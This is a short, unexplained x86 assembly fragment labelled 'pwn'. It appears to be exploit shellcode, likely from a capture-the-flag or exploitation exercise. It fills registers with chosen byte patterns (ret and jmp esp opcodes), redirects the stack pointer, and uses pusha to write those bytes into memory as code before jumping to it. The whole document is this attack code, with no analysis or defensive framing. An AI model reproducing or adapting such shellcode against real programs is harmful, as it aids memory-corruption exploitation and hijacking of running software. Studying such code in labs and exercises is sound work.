mov eax, 0xc3c3c3c3
mov ebx, 1024
mov edx, 0x84
mov ebp, eax
mov esi, 0xe4ff5160
mov edi, 0x606060e3
mov ecx, 0x420fd439
mov esp, 0xa8
call pwn
pwn:
pop esp
sub esp,4
pusha
mov esp, 0xa8
pusha
push ecx
jmp esp

